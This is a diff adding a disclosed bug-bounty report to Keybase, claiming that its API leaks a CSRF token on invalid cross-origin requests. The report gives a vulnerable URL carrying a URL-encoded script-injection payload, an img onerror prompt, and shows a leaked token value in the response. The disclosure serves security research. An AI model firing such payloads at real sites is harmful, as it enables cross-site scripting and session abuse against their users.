@@ -1,0 +1,30 @@
+ReportLink:https://hackerone.com/reports/77065
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/akhil-reni
+ReportedTo:Keybase(keybase)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:22.07.2015 20:45:48
+
+Summary:
+
+**hello**
+
+I See that you allow cross origin request in API, but you leak CSRF on every invalid request
+
+Vulnerable URL:
+===========================
+https://keybase.io/_/api/1.0/user/lookup.json?usernames=test%22%3E%3Cimg%20src=x%20onerror=prompt%281%29%3E
+
+Response
+====================================
+```
+xyz....
+"csrf_token":"lgHZIDVjN2RiOGNiZjNhZjkxYzRjYTgzMjI3MmJmY2Q1ZTA4zlWtVxXOAAFRgMDEIPn2lkhARPmRDF5dcdo+u+y+DyNuLvCZsk6wbWih8i8a"}
+```
+
+POC is attached.
+
+**Regards,
+Wesecureapp**
